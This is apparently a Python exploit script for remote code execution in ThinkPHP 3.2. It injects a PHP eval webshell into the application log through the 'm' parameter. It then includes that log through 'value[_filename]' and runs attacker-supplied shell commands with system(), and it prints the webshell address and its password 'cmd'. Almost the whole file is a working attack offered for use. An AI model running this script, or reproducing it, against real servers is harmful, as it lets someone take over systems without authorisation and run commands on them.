"""  
@Time: 2023/11/1 18:07 
@Auth: Y5neKO
@File: Thinkphp32_rce.py 
@IDE: PyCharm 
"""
import socket
import urllib
from datetime import date, timedelta
from urllib.parse import urlparse

import requests


def run(url, cmd):
    payload1 = b'''GET /index.php?m=--><?=eval($_POST[cmd]);?> HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
Upgrade-Insecure-Requests: 1

'''.replace(b'\n', b'\r\n')
    try:
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        # print('[+] 正在上传webshell.................')
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(payload1)
            req1 = conn.recv(10240).decode()
            today = (date.today() + timedelta()).strftime("%y_%m_%d")
            payload2 = urllib.parse.urljoin(url,
                                            'index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(
                                                today))
            req2 = requests.post(payload2, data={"cmd": "echo '{{{{{';system('" + str(cmd) + "');echo '}}}}}';"}, timeout=3)
        if req2.status_code == 200:
            print('[*] Webshell地址: {0}'.format(payload2))
            print('[*] 密码: cmd')
            return True, req2.text
        else:
            print('[-] webshell上传失败请检查是否存在漏洞?')
            return False, "利用失败"
    except:
        return False
